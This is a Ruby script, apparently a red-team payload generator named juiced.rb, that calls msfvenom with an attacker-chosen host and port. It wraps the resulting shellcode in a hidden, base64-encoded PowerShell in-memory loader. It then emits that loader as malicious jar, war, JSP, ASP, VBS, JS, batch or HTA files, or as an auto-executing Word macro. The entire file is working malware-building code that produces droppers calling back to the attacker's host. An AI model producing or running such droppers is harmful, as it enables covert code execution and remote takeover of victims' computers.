#!/usr/bin/env ruby
#Author: Andrew Bonstrom
#v1.8
#Credits to: Matthew Graber - Beastly PS Attack technique, TrustedSec group - Idea with Unicorn.py
require 'open3'
require 'base64'
def usage
	puts "Usage: ruby juiced.rb <msf/Venom/Payload> <lhost> <lport> <payloadFormatOption> <fileName>\n\n"
	puts "Note: A fileName is required for payload formats that output a file."
	puts "Payload Format Option: jar, war, macro, ps, vbs, asp, bat, js, and hta"
end
#######################################################################################################################
#Payload Functions Begin
#######################################################################################################################
#This first is for creating a jar file that executes the base64 encoded powershell syntax
def gen_jarFile (base64Command, fileName)
	outPut = ''
        #Strips out the \n char that unicorn adds at the end
        #Building the .java one liner
	javaStr = <<-EOS
import java.io.*;

    public class fileName
    {
        public static void main(String args[])
        {
            try
            {
                Process p=Runtime.getRuntime().exec("base64Command");
            }
            catch(IOException e1) {}
        }
    }
EOS
	javaStr = javaStr.to_s.sub("fileName", fileName)
	javaStr = javaStr.sub("base64Command", base64Command)
        File.open(fileName+".java", "w") do |f|
                f.write(javaStr)	
	end
	#Creates manifest file, grabs the user provided file name and tacks on a newline char
	File.open("manifest.txt", "w") do |f|
		f.write('Main-Class: ' + fileName + "\n")
	end
	#Builds and executes command to compile .java into .class
	#Then it creates the jar file and cleans up
	command = ('javac ' + fileName + '.java&&jar -cvfm ' + fileName + '.jar manifest.txt ' + fileName + '.class&&rm -f '+ fileName + '.class ' + fileName + '.java manifest.txt&&ls -l | grep ' + fileName + '.jar')
	#Executes command and gets rid of excess output
	Open3.popen3(command) {|stdin, stdout, stderr|}
end
#This second will create a fully copy/pasta word macro
def gen_Macro (content)
#Adds initial double quotes
	content = '"' + content
#Split every 200 chars and then rejoin with newline and string continuation in order to meet the string var limitation
	content = content.scan(/.{1,255}/).join("\" & _\r\n\"")
	content += '"'
#Splits the shellcode at the 4500 char point because thats roughly 24-25 lines for the first var
	first, second = content.slice!(0...4500), content
#Formats the output for the VBA macro
#Due to VBA restrictions for the number lines used during string concatenation of 24 lines we split
#the shell amongst two different variables and then concatenate the contents in a third variable
	puts "Option Explicit"
	puts "Sub GetShellcode()"
	puts    "\t" + "On Error Resume Next"
	puts    "\t" + "Dim wsh As Object\n"
	puts    "\t" + 'Set wsh = CreateObject("WScript.Shell")'
	puts    "\t" + "Dim f1 As String\n"
	puts    "\t" + "Dim f2 As String\n"
	puts    "\t" + "Dim f3 As String\n"
	puts    "\t" + "f1 = " + first + '"'
	puts    "\n"
	puts    "\t" + "f2 = " + '"' + second
	puts    "\t" + "f3 = f1 & f2\n"
	puts    "\t" + "wsh.Run f3, 0"
	puts    "\t" + "On Error GoTo 0"
	puts "End Sub"
	puts "Sub AutoOpen()"
	puts    "\t" + "GetShellcode"
	puts "End Sub"
	puts "Sub Workbook_Open()"
	puts    "\t" + "GetShellcode"
	puts "End Sub"
end
def gen_psCommand(base64Command)
	return base64Command 
end
def gen_jsFile(base64Command, fileName)
	str = 'var WshShell = new ActiveXObject("Wscript.Shell");WshShell.run("shellcode", 0, false);WScript.exit;'.to_s.sub("shellcode", base64Command)
	File.open(fileName + ".js", "w") do |f|
        	f.write(str)
        end
end
def gen_vbsFile(base64Command, fileName)
	str = 'CreateObject("Wscript.Shell").Run "shellcode", 0, False'.to_s.sub("shellcode", base64Command)
	        File.open(fileName + ".vbs", "w") do |f|
                f.write(str)
        	end
end
def gen_warFile(base64Command, fileName)
	#Creates the web.xml file to point to the .jsp servlet
        tempWebStr = <<-EOS1
<?xml version="1.0"?>
<!DOCTYPE web-app PUBLIC
"-//Sun Microsystems, Inc.//DTD Web Application 2.3//EN"
"http://java.sun.com/dtd/web-app_2_3.dtd">
<web-app>
<servlet>
<servlet-name>fileName</servlet-name>
<jsp-file>/fileName.jsp</jsp-file>
</servlet>
</web-app>
EOS1
	#The JSP code
	tempJspStr = <<-EOS2
<%@ page import="java.io.*" %>
<% 
Process p=Runtime.getRuntime().exec("base64Command");
%>
EOS2
	#Creates web.xml file to name the application and point to tje malicious jsp
	File.open("web.xml", "w") do |f|
		f.write(tempWebStr.to_s.gsub("fileName", fileName))
	end
        #Creates JSP file
        File.open(fileName+".jsp", "w") do |f|
                f.write(tempJspStr.to_s.sub("base64Command", base64Command))
	end
	command = ('mkdir tempDir&&mkdir tempDir/WEB-INF&&mv ' + fileName + '.jsp tempDir&&mv web.xml tempDir/WEB-INF&&cd tempDir/&&jar cvf ' + fileName + '.war *&&mv ' + fileName + '.war ../&&cd ../&&rm -rf tempDir')
	#Executes command and gets rid of excess output
        Open3.popen3(command) {|stdin, stdout, stderr|}
end
def gen_aspFile(base64Command, fileName)
	#The ASP code setup for VBS
	aspStr = <<-EOS
<% @language="VBScript" %>
<%
        Sub gPyvtjsb()
                pwcTGYXrttnM="base64Command"
                Dim HoERiLwyYpiTg
                Set HoERiLwyYpiTg = CreateObject("Wscript.Shell")
                HoERiLwyYpiTg.run pwcTGYXrttnM, 0, false
        End Sub

        gPyvtjsb
%>
EOS
	#Writes out the asp file
	File.open(fileName + ".asp", "w") do |f|
                f.write(aspStr.to_s.sub("base64Command", base64Command))
        end	
	
end
def gen_batFile(base64Command, fileName)
	#Writes out the bat file
        File.open(fileName + ".bat", "w") do |f|
                f.write("@ECHO OFF\n" + base64Command)
        end
end
def gen_htaFile(base64Command, fileName)
	#HTML File String
	htlmStr = <<EOS
<iframe id="frame" src="fileName.hta" application="yes" width=0 height=0 style="hidden" frameborder=0 marginheight=0 marginwidth=0 scrolling=no>></iframe>
EOS
	#HTA File String
	htaStr = <<EOS
<script>
a=new ActiveXObject("WScript.Shell");
a.run('base64Command', 0);window.close();
</script>
EOS
	#Writes out html index file
	File.open("index.html", "w") do |f|
		f.write(htlmStr.to_s.sub("fileName", fileName))
	end
	#Writes out .hta file
	File.open(fileName + ".hta", "w") do |f|
		f.write(htaStr.to_s.sub("base64Command", base64Command))
	end
end
##################################################################################################################
#Payload Functions End
##################################################################################################################
#Formats Msfvenom output to byte code array
def format_shellcode(content)
	#Formats shellcode by replacing \ with ,0
	content = content.gsub!('\\', ",0")
	#Deletes instances of double quote
	content = content.delete ('"')
	#Deletes instances of semi colon
	content = content.delete (";")
	#Slices all content up until the first piece of byte code
	content = content.slice(content.index(",0x")..-1)
	#Strips out newline chars to create a single line	
	content = content.gsub("\n","")
	#Strips the first comma off
	content = content[1..-1]
	return content
end
#Creates msfvenom command based on user input so far
def generate_shellcode (payload, lhost, lport)
	newVar = ''
	formattedShellcode = ''
	#Build the msfvenom command from user input
	command = ("msfvenom -p " + payload + " LHOST=" + lhost +" LPORT=" + lport + " --platform windows -f c StagerURILength=5 StagerVerifySSLCert=false")
	puts "Now running " +  command
	puts " "
	#Executes the built msfvenom command and assigns output to variable newVar
	Open3.popen3(command) {|stdin, stdout, stderr|
        newVar = stdout.read
	}
	#Msfvenom output is sent to format function
	formattedShellcode = format_shellcode(newVar)
	
	return formattedShellcode
end
def gen_command(shellcode)
	str = <<-EOS
	$v = '$R = ''[DllImport("kernel32.dll")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress,uint dwSize,uint flAllocationType,uint flProtect);[DllImport("kernel32.dll")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes,uint dwStackSize,IntPtr lpStartAddress,IntPtr lpParameter,uint dwCreationFlags,IntPtr lpThreadId);[DllImport("msvcrt.dll")]public static extern IntPtr memset(IntPtr dest,uint src,uint count);'';$J = Add-Type -memberDefinition $R -Name "Win32" -namespace Win32Functions -passthru;[Byte[]] $x=shellcodehere;$C=$J::VirtualAlloc(0,[Math]::Max($x.Length,0x1000),0x3000,0x40);for($A=0;$A -le($x.Length-1);$A++){$J::memset([IntPtr]($C.ToInt32()+$A),$x[$A],1)|Out-Null};$J::CreateThread(0,0,$C,0,0,0);for(;;){Start-sleep 60};';$n=[Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($v));$a=$ENV:Processor_Architecture;if($a -ne'x86'){iex "& $env:SystemRoot\\syswow64\\windowspowershell\\v1.0\\powershell.exe -enc $n"}else{iex $v};
EOS
	mainStr = "powershell -NoP -NonI -W Hidden -Exec Bypass -Enc " + Base64.strict_encode64(str.to_s.sub("shellcodehere", shellcode).encode("utf-16le"))
	return mainStr
end
#################################################################################
#Main
#################################################################################
if ARGV.empty?
	usage
else
	genShellcode = generate_shellcode(ARGV[0],ARGV[1], ARGV[2])
	#Call function to base64 encode everything and issue out powershell command
	command = gen_command(genShellcode)
	#Case switch statement for different payload flags
	case ARGV[3]
	when "jar"
		puts "Now creating file with .jar extension, please check local directory.\n\n"
		gen_jarFile(command, ARGV[4])
	when "ps"
		puts gen_psCommand(command)
	when "macro"
		puts "Now creating Copy/Pastable Word Macro....\n\n"
		gen_Macro(command)
	when "js"
		puts "Now creating file with .js extension, please check local directory.\n\n"
		gen_jsFile(command, ARGV[4])
	when "vbs"
		puts "Now creating file with .vbs extension, please check local directory.\n\n"
		gen_vbsFile(command, ARGV[4])
	when "war"
		puts "Now creating file with .war extension, please check local directory.\n\n"
		gen_warFile(command, ARGV[4])
	when "asp"
		puts "Now creating file with .asp extension, please check local directory.\n\n"
                gen_aspFile(command, ARGV[4])
	when "bat"
		puts "Now creating file with .bat extension, please check local directory.\n\n"
		gen_batFile(command, ARGV[4])
	when "hta"
		puts "Now creating file with .hta extension, please check local directory.\n\n"
		gen_htaFile(command, ARGV[4])
	else
	puts "You forgot to specify a payload extension."
	end
end
